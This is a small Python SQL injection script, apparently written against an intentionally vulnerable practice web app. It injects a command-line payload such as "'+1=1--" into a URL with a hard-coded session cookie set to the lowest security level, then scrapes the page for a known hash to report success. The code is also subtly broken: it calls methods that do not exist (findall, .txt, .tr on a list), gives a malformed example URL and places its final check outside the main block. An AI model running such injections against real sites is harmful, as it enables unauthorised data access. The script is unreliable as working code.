import sys
from urllib.request import urlopen, Request
from bs4 import BeautifulSoup

def exploit(url,payload,action):
    final_url = url+payload+action
    print(final_url)
    final_final_url = Request(final_url, headers = {"Cookie": "security_level=0; PHPSESSID=3f13839f27fec8ecffbd65de42778632"})
    html = urlopen(final_final_url)
    bs = BeautifulSoup(html, 'lxml')
    #print(f"bs \n{bs}")

    result = []
    #<td align="center">6885858486f31043e5839c735d99457f045affd0</td>
    for item in bs.findall("td",{"align":"center"}).tr.next_siblings:
        code = item.txt
        result.append(code)
    print(f"result \n {result}")
    if "6885858486f31043e5839c735d99457f045affd0" in result:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
        action = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: python3 %s <url> <payload> <action>" % sys.argv[0])
        print("[-] Example: python3 %s http:192.168.21.23 '+1=1-- &search" % sys.argv[0])
        sys.exit(-1)

if exploit(url,payload,action) == True:
    print("Injection successful")
else:
    print("Injection unsuccessful")